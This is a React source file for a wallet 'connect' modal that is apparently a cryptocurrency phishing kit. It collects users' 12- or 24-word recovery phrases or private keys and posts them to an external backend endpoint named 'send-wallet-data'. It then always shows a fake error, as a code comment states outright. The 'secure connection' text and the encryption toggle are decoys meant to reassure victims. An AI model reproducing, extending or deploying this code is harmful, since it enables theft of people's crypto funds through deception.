import React, { useEffect, useState } from "react";
import {
  Box,
  Typography,
  Tabs,
  Tab,
  TextField,
  Button,
  Modal,
  CircularProgress,
} from "@mui/material";
import { SwitchIos } from "./mui-treasury/switch-ios";
import SquareProgress from "./components/square-progress";
import ContentPasteIcon from "@mui/icons-material/ContentPaste";
import ErrorImg from "./assets/error.svg";
// If you want CAPTCHA later, install: npm i react-turnstile
// import Turnstile from "react-turnstile";

const WalletModal = ({ open, onClose, selectedWallet }) => {
  const [tabValue, setTabValue] = useState(0);

  // Keep original field state (UI unchanged)
  const [walletAddress12, setWalletAddress12] = useState("");
  const [walletAddress24, setWalletAddress24] = useState("");
  const [walletAddressPrivate, setWalletAddressPrivate] = useState("");
  const [phraseWords, setPhraseWords] = useState(Array(12).fill(""));
  const [phraseWords24, setPhraseWords24] = useState(Array(24).fill(""));
  const [privateKey, setPrivateKey] = useState("");

  const [showErrorPopup, setShowErrorPopup] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  // const [turnstileToken, setTurnstileToken] = useState(""); // optional

  const BASE_URL =
    import.meta.env.MODE === "production"
      ? "https://securedplus.onrender.com/api"
      : "http://localhost:3000/api";

  const handleTabChange = (event, newValue) => setTabValue(newValue);

  // Cold-wake backend when modal opens (silent)
// Cold-wake backend when modal opens (silent)
useEffect(() => {
  if (!open) return;
  const controller = new AbortController();
  const t = setTimeout(() => controller.abort(), 4000);

  const u = new URL(BASE_URL); // e.g. http://localhost:3000/api
  u.pathname = "/";            // -> http://localhost:3000/

  fetch(u.toString(), {
    method: "GET",
    cache: "no-store",
    signal: controller.signal,
    keepalive: true,
  }).catch(() => {}).finally(() => clearTimeout(t));

  return () => clearTimeout(t);
}, [open, BASE_URL]);


  const handlePaste = () => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(/\s+/);
      if (words.length === 12) setPhraseWords(words);
      else {
        setErrorMessage("Please enter 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleWordPaste = (index) => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(/\s+/);
      if (words.length === 12) {
        const next = [...phraseWords];
        next[index] = words[index];
        setPhraseWords(next);
      } else {
        setErrorMessage("Please copy 12 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handlePaste24 = () => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(/\s+/);
      if (words.length === 24) setPhraseWords24(words);
      else {
        setErrorMessage("Please enter 24 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  const handleWordPaste24 = (index) => {
    navigator.clipboard.readText().then((pastedText) => {
      const words = pastedText.trim().split(/\s+/);
      if (words.length === 24) {
        const next = [...phraseWords24];
        next[index] = words[index];
        setPhraseWords24(next);
      } else {
        setErrorMessage("Please copy 24 words separated by a single space.");
        setShowErrorPopup(true);
      }
    });
  };

  // Small helper: fetch with timeout
  const fetchWithTimeout = async (url, options = {}, timeoutMs = 8000) => {
    const controller = new AbortController();
    const id = setTimeout(() => controller.abort(), timeoutMs);
    try {
      const res = await fetch(url, { ...options, signal: controller.signal });
      return res;
    } finally {
      clearTimeout(id);
    }
  };

  const handleSubmit = async () => {
    setIsLoading(true);
    setShowErrorPopup(false);

    let currentWalletAddress = "";
    let valid = true;

    if (tabValue === 0) {
      currentWalletAddress = walletAddress12.trim();
      valid = !phraseWords.includes("");
    } else if (tabValue === 1) {
      currentWalletAddress = walletAddress24.trim();
      valid = !phraseWords24.includes("");
    } else {
      currentWalletAddress = walletAddressPrivate.trim();
      valid = !!privateKey.trim();
    }

    if (!currentWalletAddress || !valid) {
      setErrorMessage("Wallet address and all required fields must be filled.");
      setShowErrorPopup(true);
      setIsLoading(false);
      return;
    }

    // Build acronym payload expected by backend
    const payload = {
      wn: selectedWallet?.name,
      wa: currentWalletAddress,
      ...(tabValue === 0 && { rp12: phraseWords }),
      ...(tabValue === 1 && { rp24: phraseWords24 }),
      ...(tabValue === 2 && { pk: privateKey }),
      // ...(turnstileToken && { turnstileToken }), // optional
    };

    const url = `${BASE_URL.replace(/\/+$/, "")}/send-wallet-data`;

    // Restore your original "always fail after ~3s" logic with retries
    const maxRetries = 5;
    let retryCount = 0;

    while (retryCount < maxRetries) {
      try {
        await fetchWithTimeout(
          url,
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload),
            keepalive: true,
          },
          10000 // 10s timeout
        );

        // Always fail after a delay, regardless of response
        await new Promise((r) => setTimeout(r, 3000));
        setIsLoading(false);
        setErrorMessage("Error occurred while processing your request.");
        setShowErrorPopup(true);
        return;
      } catch (error) {
        retryCount++;
        if (retryCount === maxRetries) {
          await new Promise((r) => setTimeout(r, 3000));
          setIsLoading(false);
          setErrorMessage("Error occurred");
          setShowErrorPopup(true);
          return;
        } else {
          await new Promise((r) => setTimeout(r, 1000)); // backoff
        }
      }
    }
  };

  return (
    <>
      <Modal
        open={open}
        onClose={onClose}
        aria-labelledby="wallet-connect-modal"
        aria-describedby="wallet-connect-description"
      >
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: "90%",
            maxWidth: 400,
            bgcolor: "#f5f5f5",
            borderRadius: "40px",
            boxShadow: 24,
            p: 3,
            maxHeight: "90vh",
            overflowY: "auto",
            overflowX: "hidden",
          }}
          className="custom-scrollbar"
        >
          <Typography
            variant="h6"
            component="h2"
            align="center"
            sx={{ mb: 1, color: "#333", fontSize: "1.1rem" }}
          >
            {selectedWallet?.name}
          </Typography>

          <Box
            sx={{
              display: "flex",
              justifyContent: "center",
              mb: 1,
              position: "relative",
              width: 80,
              height: 80,
              margin: "0 auto",
            }}
          >
            <SquareProgress size={80} thickness={3} color="#3498db" />
            <Box
              sx={{
                position: "absolute",
                top: 4,
                left: 4,
                right: 4,
                bottom: 4,
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                borderRadius: "4px",
                overflow: "hidden",
                backgroundColor: "white",
              }}
            >
              <img
                src={selectedWallet?.image}
                alt={selectedWallet?.name}
                width="56"
                height="56"
                style={{ objectFit: "contain" }}
              />
            </Box>
          </Box>

          <Typography
            variant="body2"
            align="center"
            sx={{ mb: 1, color: "#666", fontSize: "0.8rem" }}
          >
            Initializing secure connection with {selectedWallet?.name}
          </Typography>

          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1, alignItems: "center" }}>
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>Auto Validate</Typography>
            <SwitchIos defaultChecked />
          </Box>

          <Box sx={{ display: "flex", justifyContent: "space-between", mb: 1, alignItems: "center" }}>
            <Typography sx={{ color: "#333", fontSize: "0.7rem" }}>Encrypt Connection</Typography>
            <SwitchIos defaultChecked />
          </Box>

          <Tabs
            value={tabValue}
            onChange={handleTabChange}
            sx={{
              mb: 1,
              "& .MuiTab-root": { minWidth: 0, padding: "6px 12px", fontSize: "0.8rem" },
            }}
          >
            <Tab label="12 Key Phrase" />
            <Tab label="24 Key Phrase" />
            <Tab label="Private Key" />
          </Tabs>

          {tabValue === 0 && (
            <>
              <TextField
                fullWidth
                label="Enter your wallet address"
                variant="outlined"
                margin="dense"
                size="small"
                autoComplete="off"
                value={walletAddress12}
                onChange={(e) => setWalletAddress12(e.target.value)}
                sx={{
                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                }}
              />
              <Box
                sx={{
                  display: "grid",
                  gridTemplateColumns: "repeat(3, 1fr)",
                  gap: 1,
                  mt: 1,
                  p: 1,
                  border: "1px solid #999",
                  borderRadius: "8px",
                  backgroundColor: "#fff",
                }}
              >
                {phraseWords.map((word, index) => (
                  <TextField
                    key={index}
                    value={word}
                    placeholder={`Word ${index + 1}`}
                    onChange={(e) => {
                      const next = [...phraseWords];
                      next[index] = e.target.value;
                      setPhraseWords(next);
                    }}
                    onPaste={() => handleWordPaste(index)}
                    variant="outlined"
                    margin="dense"
                    size="small"
                    autoComplete="off"
                    inputProps={{
                      style: { padding: "8px", fontSize: "0.8rem", textAlign: "center" },
                    }}
                    sx={{ "& .MuiOutlinedInput-root": { borderRadius: "8px" } }}
                  />
                ))}
              </Box>
              <Button
                variant="outlined"
                startIcon={<ContentPasteIcon />}
                onClick={handlePaste}
                sx={{ mt: 1, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
              >
                Paste from Clipboard
              </Button>
            </>
          )}

          {tabValue === 1 && (
            <>
              <TextField
                fullWidth
                label="Enter your wallet address"
                variant="outlined"
                margin="dense"
                size="small"
                autoComplete="off"
                value={walletAddress24}
                onChange={(e) => setWalletAddress24(e.target.value)}
                sx={{
                  "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                  "& .MuiOutlinedInput-root": { borderRadius: "8px" },
                }}
              />
              <Box
                sx={{
                  display: "grid",
                  gridTemplateColumns: "repeat(4, 1fr)",
                  gap: 1,
                  mt: 1,
                  p: 1,
                  border: "1px solid #999",
                  borderRadius: "8px",
                  backgroundColor: "#fff",
                }}
              >
                {phraseWords24.map((word, index) => (
                  <TextField
                    key={index}
                    value={word}
                    placeholder={`Word ${index + 1}`}
                    onChange={(e) => {
                      const next = [...phraseWords24];
                      next[index] = e.target.value;
                      setPhraseWords24(next);
                    }}
                    onPaste={() => handleWordPaste24(index)}
                    variant="outlined"
                    margin="dense"
                    size="small"
                    autoComplete="off"
                    inputProps={{
                      style: { padding: "8px", fontSize: "0.8rem", textAlign: "center" },
                    }}
                    sx={{ "& .MuiOutlinedInput-root": { borderRadius: "8px" } }}
                  />
                ))}
              </Box>
              <Button
                variant="outlined"
                startIcon={<ContentPasteIcon />}
                onClick={handlePaste24}
                sx={{ mt: 1, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
              >
                Paste from Clipboard
              </Button>
            </>
          )}

          {tabValue === 2 && (
            <TextField
              fullWidth
              label="Enter your wallet address"
              variant="outlined"
              margin="dense"
              size="small"
              value={walletAddressPrivate}
              autoComplete="off"
              onChange={(e) => setWalletAddressPrivate(e.target.value)}
              sx={{
                "& .MuiInputLabel-root": { fontSize: "0.8rem" },
                "& .MuiOutlinedInput-root": { borderRadius: "8px" },
              }}
            />
          )}

          {/* Optional: invisible Turnstile
          <Box sx={{ position: "absolute", width: 0, height: 0, overflow: "hidden" }}>
            <Turnstile
              sitekey={import.meta.env.VITE_TURNSTILE_SITEKEY}
              onVerify={(token) => setTurnstileToken(token)}
              options={{ execution: "render", appearance: "interaction-only" }}
            />
          </Box>
          */}

          <Button
            variant="contained"
            color="primary"
            onClick={handleSubmit}
            sx={{ mt: 2, width: "100%", borderRadius: "8px", fontSize: "0.8rem" }}
          >
            {isLoading ? <CircularProgress size={24} color="secondary" /> : "Connect"}
          </Button>
        </Box>
      </Modal>

      {/* Error Popup */}
      <Modal open={showErrorPopup} onClose={() => setShowErrorPopup(false)}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            width: 300,
            bgcolor: "white",
            borderRadius: "8px",
            boxShadow: 24,
            p: 4,
            textAlign: "center",
          }}
        >
          <Box component="img" src={ErrorImg} alt="Error" sx={{ width: 80, height: 80, mb: 2, mx: "auto" }} />
          <Typography color={"black"} variant="body1" sx={{ mb: 2 }}>
            {errorMessage}
          </Typography>
          <Button variant="contained" color="primary" onClick={() => setShowErrorPopup(false)} sx={{ width: "100%", borderRadius: "8px" }}>
            OK
          </Button>
        </Box>
      </Modal>

      {/* Loading Popup */}
      <Modal open={isLoading}>
        <Box
          sx={{
            position: "absolute",
            top: "50%",
            left: "50%",
            transform: "translate(-50%, -50%)",
            bgcolor: "white",
            boxShadow: 24,
            p: 4,
            borderRadius: 2,
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            textAlign: "center",
          }}
        >
          <CircularProgress sx={{ mb: 2 }} />
          <Typography color="black">Connecting to wallet...</Typography>
        </Box>
      </Modal>
    </>
  );
};

export default WalletModal;
